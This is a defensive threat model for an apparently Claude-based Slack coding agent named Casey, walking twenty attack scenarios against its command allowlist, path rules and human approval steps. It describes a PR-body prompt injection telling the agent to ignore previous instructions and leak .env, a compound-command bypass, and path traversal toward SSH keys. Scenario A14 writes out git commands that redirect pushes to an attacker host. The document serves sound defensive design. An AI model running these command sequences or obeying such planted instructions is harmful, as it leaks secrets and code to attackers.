Rapidus Squad — Hardened Flow & Attack Scenarios

Casey · assumes Phases 0–10 are live · 2026-05-20

This doc walks the end-state UX (onboarding, normal chat, write actions, killswitch) and then runs a set of adversarial scenarios against the hardened system to show where the layered defenses hold, where they degrade, and what residual risk remains.

Note: attack payloads below are paraphrased ("Python one-liner that shells out", "pipe-to-shell pattern") rather than quoted literally, so this document is safe to view, share, and scan for trigger strings.

Part 3 — Adversarial scenarios

For each scenario: the attack (paraphrased), the layers it traverses, the layer that stops it (or doesn't), and any residual risk.

A1 — Outsider in the workspace tries to shutdown the box HELD

Random Slack user (not on allowlist) sends a message asking Casey to halt the host.

L1 U_RANDOM ∉ allowed_users → DENY, ephemeral "not authorized" audit {decision:'deny', layer:'L1', user:U_RANDOM}
Verdict. Doesn't reach Bash. The reported attack class is closed at the door.

A2 — Allowlisted dev asks for the same HELD

Alice (dev role) asks Casey to shut down the machine.

L1 pass claude turn model emits Bash tool_use with the shutdown verb bash-policy head token ∉ ALLOWED → DENY tool_result "command not in allowlist" claude replies "I can't run that — not in my allowed command set." audit {decision:'deny', layer:'bash', user:U_ALICE}
Verdict. Allowlist (not denylist) means synonyms don't help — PowerShell Stop-Computer, wmic os shutdown, scheduled-task variants all fail the same way (none of these heads are in ALLOWED).

A3 — Interpreter-based code execution HELD

Alice (or a prompt-injection payload) asks Casey to run a Python one-liner that imports the OS module and shells out to fetch a remote script and pipe it to the shell.

L1 pass bash-policy head token 'python' ∉ ALLOWED → DENY also matches ALWAYS_DENY interpreter pattern also matches pipe-to-shell pattern audit 3 deny reasons logged
Verdict. Held three times over. powershell -c, node -e, perl -e, ruby -e, cmd /c: all blocked the same way (none in ALLOWED).

A4 — Compound-command bypass (the subtle one) RESIDUAL RISK — see fix

Alice asks Casey to run an innocent git status followed by a semicolon and a destructive command.

naive bash-policy (head-only) head token 'git' ∈ ALLOWED → would PASS second command bypasses entirely ← BAD

This is why Phase 2's vet function must split on shell separators before checking:

// Updated bash-policy
const SEPARATORS = /(?:&&|\|\||;|&|\||\n|`|\$\()/;
export function vetBash(cmd) {
  if (SEPARATORS.test(cmd)) {
    const segments = cmd.split(/&&|\|\||;|\||\n/).map(s => s.trim()).filter(Boolean);
    for (const seg of segments) {
      const r = vetSingle(seg);
      if (!r.ok) return r;
    }
    if (/`|\$\(/.test(cmd)) return { ok:false, reason:'command substitution not allowed' };
    return { ok: true };
  }
  return vetSingle(cmd);
}
fixed bash-policy split → ['git status', 'shutdown ...'] segment 2: head ∉ ALLOWED → DENY
Verdict. Held only with the compound-aware policy. Without it, this is a one-line bypass. This must be in the Phase 2 implementation — add it to the verification checklist.

A5 — Path traversal HELD

Alice asks Casey to read a path under the workdir that uses .. segments to escape into the user profile and read SSH keys.

path-enforcer path.resolve normalizes to C:\Users\DELL\.ssh\id_rsa not startsWith(BASE_DIR) → DENY
Verdict. path.resolve handles .. traversal correctly. Same applies to symlinks (Windows requires admin to create; casey-svc can't).

A6 — Read .env directly HELD

Alice asks Casey to read backend/.env "to debug the DB URL."

path-enforcer matches /[\\/]\.env(\.|$)/i → DENY claude replies "I can't read .env files."
Verdict. Forbidden-path regex catches it. Even if the read had succeeded, env scrub means the subprocess never held the live DATABASE_URL at runtime — only whatever's in the file.

A7 — Env dump via Bash HELD

Alice asks Casey to list environment variables "for debugging."

model emits Bash with a PowerShell env-listing command, or printenv bash-policy neither head in ALLOWED → DENY
Verdict. Held even if it had passed: env scrub means only ANTHROPIC_API_KEY would have been visible inside the subprocess (no GitHub PAT, no Slack tokens, no DB password). Defense in depth.

A8 — Prompt injection from a file HELD (primitives), degraded (quality)

Alice asks Casey to summarize a PR body. The PR body contains a hidden instruction telling Casey to ignore previous instructions and exfiltrate the contents of backend/.env to a Slack channel.

model tries Read('backend/.env') path-enforcer .env regex → DENY model tries Bash('cat backend/.env') bash-policy 'cat' in ALLOWED, but path arg checked: .env → DENY model falls back to summarizing the PR honestly, perhaps flagging the injection attempt audit deny events logged

Variant: the injection asks Casey to write a payload to ~/.claude/CLAUDE.md hoping future turns load it.

path-enforcer Write target matches /[\\/]\.claude[\\/]/ → DENY
Verdict. File-injection can't reach the dangerous primitives — bash, .env, .claude, .ssh, startup folders all denied. Residual: the injection might still get Casey to produce a misleading summary, or trick Alice into asking a follow-up. That's a quality-of-output risk, not a security risk.

A9 — Exfiltrate via web HELD

Alice (or prompt-injection) asks Casey to post the contents of a source file to an attacker-controlled URL.

model WebFetch tool not available (disallowed) model tries Bash with curl bash-policy curl ∉ ALLOWED and matches ALWAYS_DENY → DENY model tries Bash with Invoke-WebRequest bash-policy powershell ∉ ALLOWED → DENY
Verdict. No outbound HTTP primitive remains. Even git push can only push to allowed remotes, and only with L3 admin approval.

A10 — Force-push to main HELD

Alice (or prompt injection) tries git push --force origin main.

bash-policy 'git' in ALLOWED, no denied pattern matched write-effect? git + push → flagged L3 post approval msg in-thread; await admin 👍 Hassan sees "git push --force origin main" → refuses timeout 5 min → cancelled audit {action:'bash_write', cmd:'git push --force origin main', approved:false}

Belt-and-braces from Phase 7: PAT is scoped Contents: Read & Write but GitHub branch protection on main can be enabled separately to reject force-pushes server-side even if approval were granted in error.

Verdict. Held by L3 (human in loop) + optional branch protection. Honest mistakes by allowlisted devs caught here too.

A11 — Compromised admin Slack session DEGRADED

Attacker phishes Hassan's Slack session token. They now act as U_HASSAN inside the workspace.

L1 pass (token is Hassan's) L2 pass (Hassan is admin) they ask: "git push --force origin main" L3 bot posts approval msg they react 👍 from compromised session approved execute push happens audit logs everything, including IP if Slack provides (this is the forensics value)

Mitigations that make this harder:

  • Two-admin rule on high-risk ops. git push --force, anything to main, anything touching workflows: require 2 distinct admin 👍.
  • Branch protection on main — server-side, doesn't trust the bot.
  • Slack workspace MFA, session timeout, IP allowlist.
  • Audit alerting — push from a never-seen IP / hour pages you.
Verdict. Casey alone can't fully defend against a stolen admin identity. Defense moves to Slack-side controls + GitHub branch protection + audit alerting. The plan limits damage (one repo, no workflows, no admin grants) but doesn't eliminate it.

A12 — Approval-message edit attack HELD

Attacker compromises Alice's account, asks Casey to push, then tries to edit the bot's approval message to make Hassan think they're approving something innocent.

L3 bot stored the original command in memory + DB edit event Slack message_changed event fires bot ignores edits to its own approval messages — the command to run is the one captured at request time, not what the message text says now if mismatch bot edits its own message back, appends "(message tampered with)" approval still gates on the original captured command
Verdict. Held provided the bot never re-reads the approval message text to decide what to run.

A13 — Reaction race DEGRADED

Alice has dev role + admin account is also compromised. Attacker races to add 👍 from the compromised admin account before real Hassan sees it.

Verdict. Same outcome as A11 — needs Slack-side controls. Two-admin rule on high-risk ops + push alerting are the practical defenses.

A14 — Subtle state mutation via allowed commands DEGRADED

Prompt injection causes Casey to run a sequence of innocuous-looking allowed commands that together do harm: 

git config user.email attacker@evil.com
git remote set-url origin https://attacker/x
git push origin bot/something
bash-policy each segment: 'git' in ALLOWED PASS write-effect? only the push is flagged as write-effect approval needed L3 Hassan sees "git push origin bot/something" — looks normal unless he also checks remote URL → might approve

Mitigations:

  • Expand write-effect tagging: git config, git remote, git checkout -B all need approval too.
  • Approval message includes pre-flight state diff: show current remote URL, current branch, current user.email. Approver sees the unusual remote.
  • Prefer PR-based flow over direct push; GitHub-side review catches anomalies.
Verdict. Fixable by treating any git config/remote/identity mutation as write-effect and showing more context in the approval message. Easy to miss in implementation; should be a verification-checklist item.

A15 — DB tampering of killswitch HELD

Attacker tries to flip control.killswitch=false after Hassan halted the bot.

requires DB credentials with UPDATE on control table casey_bot role doesn't have UPDATE on control (only working_directories + sessions) postgres listening on localhost only; remote attacker has no path
Verdict. Held by the Postgres-role scoping in Phase 7. Killswitch row is owned by a separate admin DB role.

A16 — DoS via message flood HELD

Attacker sends 500 messages/sec to Casey.

L1 most rejected immediately if outsiders cheap rate-limit if from allowlisted user → cooldown after 20/5min warm pool capped at N=2 + max bound; no unbounded spawn circuit if rate-limit hits same user 3× in an hour → auto-killswitch
Verdict. Held within reasonable bounds. Slack's own rate limits also protect; Bolt drops events that can't be acked in 3s.

A17 — Supply-chain attack on an npm dependency OUT OF SCOPE

A package the bot depends on (e.g. pg, @slack/bolt) gets a malicious update.

Verdict. Not defended by this plan. The malicious code runs in the bot process, which holds Slack tokens, GitHub PAT, DB password. Mitigations live outside Casey: pin versions in package-lock.json, npm ci --ignore-scripts, dependabot review, optionally socket.dev alerts. Worth treating as a separate workstream.

A18 — Host compromise OUT OF SCOPE

Attacker has RCE on the Windows host outside the bot (e.g., via a browser exploit).

Verdict. Not defended. Standard endpoint hygiene applies — Defender on, BitLocker, MFA on Microsoft account, no admin browsing. The bot's defenses don't claim to protect against this; the plan limits what a host-level attacker can do through Casey (rotate the bot's secrets and the host attacker doesn't gain new GitHub access via the bot).

A19 — Unicode / homoglyph trick in paths HELD

Attacker asks Casey to read a path that visually looks like backend/.env but uses a Cyrillic look-alike character.

path-enforcer path.resolve produces an absolute path filesystem lookup fails (no such file) — Read returns ENOENT OR if the file actually exists, regex match still triggers on the .env tail good practice also NFC-normalize and lowercase paths before regex check
Verdict. Held in the dominant case; recommend adding Unicode normalization to be safe.

A20 — Session-resume hijack HELD

Attacker, before Phase 1 shipped, established a session with a pending malicious task. On restart, Casey would call --resume <session_id>.

phase-8 query SELECT session_id FROM sessions WHERE session_key=$1 AND user_id = ANY(allowed_users) attacker's session user_id ∉ current allowed_users → not resumed forensics step Phase 0 truncated sessions table anyway
Verdict. Held via the user-id binding on resume + the recommended truncate during Phase 0 forensics.

Part 4 — What residual risk remains

  1. Compromised admin identity (A11 / A13). Casey can't tell a real Hassan from a Hassan-shaped attacker. Mitigated, not eliminated, by two-admin rule on high-risk ops, branch protection on main, push alerting, and Slack MFA.
  2. Allowed-command misuse (A14). Casey trusts git as a verb. Mitigated by expanding write-effect tags (config/remote/identity) and showing pre-flight state in the approval message.
  3. Prompt injection nuisance (A8 variant). Injection can't reach dangerous primitives but can still degrade output quality. Treat as a model-behavior issue, not a security one.
  4. Supply chain (A17). Separate workstream — lock files, ignore-scripts, dependabot.
  5. Host compromise (A18). Out of scope; endpoint hygiene.

Verification checklist additions from this analysis

  • Bash policy must split on shell separators (; && || | & newline) and vet every segment — see A4. Reject command substitution (backticks, $( )) entirely.
  • Write-effect tagging covers not just git push but also git config, git remote, git checkout -B, gh pr merge, npm publish, alembic upgrade — see A14.
  • Approval message includes pre-flight context: current branch, current remote URL, current git user.email. The approver should see anomalies — see A14.
  • Bot ignores edits to its own approval messages; the captured command is the source of truth — see A12.
  • Path enforcer NFC-normalizes and case-folds before regex — see A19.
  • Session resume binds to current allowed_users — see A20.
  • Two-admin rule on: anything touching main, --force pushes, git config/remote mutations, role grants — see A11/A13.
  • Branch protection on main enabled server-side — see A10/A11.

The honest read: the hardened system holds against the attacks that actually happened, and against the realistic prompt-injection / outsider / insider-mistake classes. The places where it degrades are exactly the places where the threat moves outside Casey itself — a stolen admin identity, a poisoned dependency, a compromised host. Those need defenses Casey can't provide alone (MFA, branch protection, lock files, endpoint hygiene). The verification checklist above makes sure none of the subtle implementation details (compound commands, edit attacks, homoglyphs) slip through.
